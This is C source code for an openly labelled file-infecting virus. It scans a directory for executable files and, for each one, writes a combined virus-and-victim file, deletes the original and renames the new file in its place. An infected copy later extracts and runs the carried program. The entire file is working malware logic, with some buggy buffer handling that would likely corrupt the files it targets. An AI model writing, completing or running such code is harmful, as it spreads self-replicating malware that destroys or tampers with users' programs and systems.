#include <stdio.h>
#include <sys/types.h> //opendir, stat
#include <dirent.h> //opendir
#include <errno.h>
#include <string.h>
#include <sys/stat.h> //stat
#include <stdlib.h> //free, malloc
#include <unistd.h>
#include <fcntl.h>

#define SIZE 1000;
unsigned long virus_size = 12632;

void infect(char * fileName)
{
	printf("Infecting: %s\n", fileName);
	// new file to concatenate executables
	FILE* fD;
	char *file_path = "infected.exe";
	// create file with executable permission and open it
	int fd = open(file_path, O_RDWR | O_CREAT, 0777);
	perror("open");
	close(fd);
	perror("close");
	fD = fopen(file_path, "w");
    // open victim file and get size
	FILE *victimfd = fopen(fileName, "rb");
  	fseek(victimfd, 0, SEEK_END);
  	unsigned long victim_filesize = ftell(victimfd);
	rewind(victimfd);
	// open virus file
	FILE *virusfd = fopen("virus.exe", "rb");
	// allocate buffer for new file
	char *buffer = (char*)malloc(sizeof(char)*(victim_filesize+virus_size));
	// load victim in buffer
	fread(buffer, sizeof(char), victim_filesize, victimfd);
	// load virus in buffer
	fread(buffer, sizeof(char), virus_size, virusfd);
	
	// write concatenation to file
    fwrite(buffer, sizeof(char), victim_filesize+virus_size, fD);
	
	// delete original victim file
	int ret = remove(fileName);
	
   	if(ret == 0) {
		printf("File deleted successfully");
   	} else {
      	printf("Error: unable to delete the file");}

	// rename new file to victim's name
	ret = rename("infected.exe",fileName);
	if(ret == 0) {
		printf("File renamed succesfully.");
   	} else {
      	printf("Error: unable to rename file");}

	// close files
	//close(fd);
    fclose(fD);
	fclose(victimfd);
	fclose(virusfd);
}


int main(int argc, char** argv) {
	char* exe_name = basename(argv[0]);
	FILE * basefd = fopen(exe_name, "rw");
	fseek(basefd, 0, SEEK_END);
  	unsigned long base_filesize = ftell(basefd);
	rewind(basefd);

	// checking if we are infected file or origin virus
	if(base_filesize >  virus_size)
	{
		// new file to copy base program
		FILE* fD;
		char *file_path = "temp.exe";
		// create file with executable permission and open it
		int fd = open(file_path, O_RDWR | O_CREAT, 0777);
		perror("open");
		close(fd);
		perror("close");
		fD = fopen(file_path, "w");

		char *buffer = (char*)malloc(sizeof(char)*(base_filesize - virus_size));
		// put pointer of file to base program location
		fseek(basefd, virus_size, SEEK_SET);
		// put contents on the buffer
		fread(buffer, sizeof(char), base_filesize - ftell(basefd), basefd);
		// write to temp file
    	fwrite(buffer, sizeof(char), base_filesize - virus_size, fD);

		fclose(basefd);
		fclose(fD);
		
		// run temp program
		int status = system("./temp.exe");
	}

	else{
    if (argc < 2) {
        fprintf(stderr, "Usage: ./a.out path_to_a_directory \n");
        return 1;
    }
    char* path_to_directory = argv[1];
    int path_length = strlen(path_to_directory);
    int modified = 0;
    //Modify path so that a dash is at the end.
    if (path_to_directory[path_length - 1] != '/') {
        char* modified_path = (char *) malloc(sizeof(char) * (strlen(path_to_directory) + 2));
        //Copies the null character as well.
        strcpy(modified_path, path_to_directory);
        modified_path[path_length] = '/';
        modified_path[path_length + 1] = '\0';
        path_to_directory = modified_path;
        //Set flag to true so that the dynamically allocated memory is freed later.
        modified = 1;
    }

    //Get the directory stream corresponding to the directory. 
    DIR* in_directory_stream = opendir(path_to_directory);
    if (in_directory_stream == NULL) {
        fprintf(stderr, "Error: the specified directory cannot be found or opened. \n", errno);
        if (modified) free(path_to_directory);
        return 1;
    }
    struct dirent* entry = NULL; 
    printf("Files that are executable by at least one of the permission classes (owner, group, others) are: \n");
    while ((entry = readdir(in_directory_stream)) != NULL) {
        //All directories contain . and .., which corresponds to current and parent directory respectively,
        //in unix systems. Since we are looking for only executable files, we can ignore them. 
        if (!strcmp(".", entry->d_name)) {
            continue;
        }
        if (!strcmp("..", entry->d_name)) {
            continue;
        }
        //Get file information. 
        struct stat entry_info;
        /* Create the absolute path of the entry.
         * Without it, as mentioned by Shawn below, 
         * stat will look for a file with the entry's name in current working directory 
         * instead of the specified directory. 
         */
        char* entry_absolute_path  = (char *) malloc(sizeof(char) * (strlen(path_to_directory) 
                    + strlen(entry->d_name) + 1));
        strcat(entry_absolute_path, path_to_directory);
        strcat(entry_absolute_path, entry->d_name);       
       if (stat(entry_absolute_path, &entry_info) == -1) {
            fprintf(stderr, "Error in obtaining file information about %s\n", entry->d_name);
       } else {
           // Check if the file is not a directory and 
           // is executable by one of the permission classes (owner, group, others). 
           if (((entry_info.st_mode & S_IFMT) != S_IFDIR) && 
                   ((entry_info.st_mode & S_IXUSR) || (entry_info.st_mode & S_IXGRP) 
                   || (entry_info.st_mode & S_IXOTH))) {
								
               	printf("%s\n", entry->d_name);
				if(entry->d_name != "virus.exe")
				{
					infect(entry->d_name);
				}
           }
       } 
           free(entry_absolute_path);
    }
    //Close directory stream.
    closedir(in_directory_stream);    
    if (modified) free(path_to_directory);
	}
    return 0;
}
